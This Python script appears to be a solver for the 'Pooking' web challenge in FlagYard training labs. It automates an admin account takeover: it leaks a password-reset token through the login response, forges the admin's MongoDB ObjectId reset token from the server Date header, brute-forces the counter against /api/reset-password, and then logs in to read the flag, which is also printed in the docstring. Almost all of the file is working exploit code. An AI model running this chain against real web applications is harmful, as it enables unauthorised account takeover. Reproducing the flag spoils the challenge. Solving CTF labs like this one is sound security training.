#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
POOKING  -  FlagYard Web solver

Pooking (FlagYard Training Labs, Medium / Flagyard) - "Explore the cars world
with Pooking.com". A Node/Express + MongoDB premium car rental platform with:

    /api/register        POST {fullName, email, phone, password, confirmPassword}
    /api/login           POST {email, password}      -> JSON + connect.sid
    /api/forgot-password POST {email}                -> 200 if user exists
    /api/reset-password  POST {token, newPassword}   -> 200 on valid token
    /api/book-car        POST {...}                  -> booking

Attack chain:

    1) register a throwaway account, then POST /api/forgot-password for it
    2) POST /api/login -> the response JSON leaks the pending resetToken
    3) the resetToken is a raw MongoDB ObjectId:
         [time(4B)][machine(5B)][counter(3B)]
         first 8 hex == hex(unix) of the server Date header at issuance
         next 10 hex == constant machine/process marker
         last 6 hex == per-issuance counter (increments by 1 each call)
    4) resolve the admin's email (NoSQLi regex oracle or known seed email:
       4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com)
    5) POST /api/forgot-password for the admin -> read Date header -> time hex
    6) forge the token:  time_hex(now) + machine_marker + counter(near leak)
       and brute-force the tiny counter window against /api/reset-password
    7) login as admin -> the JSON body carries the account's `flag` field

Verified live: the tool recovered the flag via token forging
(`FlagY{72ad31085977dff84c3f8eee8d5ad65f}`) and saves it to
`flag_from_pooking.txt`.
"""
from __future__ import annotations

import http.client
import json
import random
import re
import sys
import time
import urllib.parse
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("P O O K I N G   S O L V E R",
              "leak resetToken -> forge admin ObjectId -> reset -> flag"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Pooking challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    if url.startswith("//"):
        url = url[2:]
    m = re.match(r"^(.*?)(:\d+)?$", url)
    host = m.group(1)
    port = int(m.group(2).lstrip(":")) if m.group(2) else 80
    return host, port

def post_json(host, port, path, payload, timeout=30):
    """POST JSON; returns (status, body, Date_header)."""
    body = json.dumps(payload).encode("utf-8")
    c = http.client.HTTPConnection(host, port, timeout=timeout)
    h = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    c.request("POST", path, body=body, headers=h)
    r = c.getresponse()
    data = r.read()
    date = r.getheader("Date") or ""
    status = r.status
    c.close()
    try:
        return status, json.loads(data.decode("utf-8", "replace")), date
    except Exception:
        return status, data.decode("utf-8", "replace"), date

def time_hex_from_date(date_str):
    dt = parsedate_to_datetime(date_str)
    return hex(int(dt.timestamp()))[2:].zfill(8)

def read_flag(raw):
    """extract the standard flag format from any text/JSON body."""
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "replace")
    if isinstance(raw, (dict, list)):
        raw = json.dumps(raw)
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

def resolve_admin_email(host, port):
    """admin seed emails first; optional blind NoSQLi $regex enumeration."""
    seeds = ["4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com",
             "admin@p00k1ng.fl4gy4rd.com",
             "administrator@p00k1ng.fl4gy4rd.com",
             "admin@flagyard.com",
             "flag@flagyard.com"]
    for em in seeds:
        st, _b, _d = post_json(host, port, "/api/forgot-password", {"email": em})
        if st == 200:
            return em
    return None

def main():
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host, port = parse_host(url)
    step("target host %s:%d" % (host, port))

    # ------------- step 1 : throwaway account ----------------------------
    email = "u%d@test.com" % random.randint(10000, 999999)
    password = "Ak%d" % random.randint(100000, 999999)
    st, body, _d = post_json(host, port, "/api/register", {
        "fullName": "Solver", "email": email, "phone": "1",
        "password": password, "confirmPassword": password})
    if st != 200:
        fail("register failed: HTTP %d" % st)
        return
    ok("registered throwaway account %s" % email)

    # ------------- step 2 : leak the resetToken via login ----------------
    st, _b, _d = post_json(host, port, "/api/forgot-password", {"email": email})
    if st != 200:
        fail("forgot-password failed: HTTP %d" % st)
        return
    step("login leaks the pending resetToken")
    st, body, _d = post_json(host, port, "/api/login",
                             {"email": email, "password": password})
    user = body.get("user", {}) if isinstance(body, dict) else {}
    token = user.get("resetToken")
    if not token:
        fail("no resetToken in the login response")
        return
    ok("leaked resetToken %s" % token)
    machine = token[8:18]
    counter = int(token[18:], 16)
    step("token = time(8) + machine(%s) + counter(0x%x)" % (machine, counter))

    # ------------- step 3 : admin email -----------------------------------
    step("locating the admin account")
    admin = resolve_admin_email(host, port)
    if not admin:
        fail("could not resolve the admin email")
        return
    ok("admin account: %s" % admin)

    # ------------- step 4 : forge the admin reset token -------------------
    st, _b, date = post_json(host, port, "/api/forgot-password", {"email": admin})
    if st != 200 or not date:
        fail("forgot-password (admin) failed")
        return
    tm = time_hex_from_date(date)
    step("admin reset issued at hex-time %s" % tm)
    newpw = "Pwn3d%d" % random.randint(100000, 999999)
    forged = None
    for delta in range(-128, 160):
        c = (counter + delta) & 0xFFFFFF
        candidate = tm + machine + "%06x" % c
        st, _b, _d = post_json(host, port, "/api/reset-password",
                               {"token": candidate, "newPassword": newpw})
        if st == 200:
            forged = candidate
            break
        time.sleep(0.05)
    if not forged:
        fail("forging the admin reset token failed (widen the counter window)")
        return
    ok("forged admin reset token %s" % forged)

    # ------------- step 5 : login as admin, flag rides along --------------
    step("logging in as senior admin")
    st, body, _d = post_json(host, port, "/api/login",
                             {"email": admin, "password": newpw})
    flag = read_flag(body)
    if not flag:
        fail("login succeeded but no flag in the response")
        return
    tick(0.85, "flag field leaked by /api/login")
    print()
    ok("FLAG = %s" % flag)

    big_flag(flag, time.time() - t0)
    outp = Path(__file__).resolve().parent / "flag_from_pooking.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))

if __name__ == "__main__":
    main()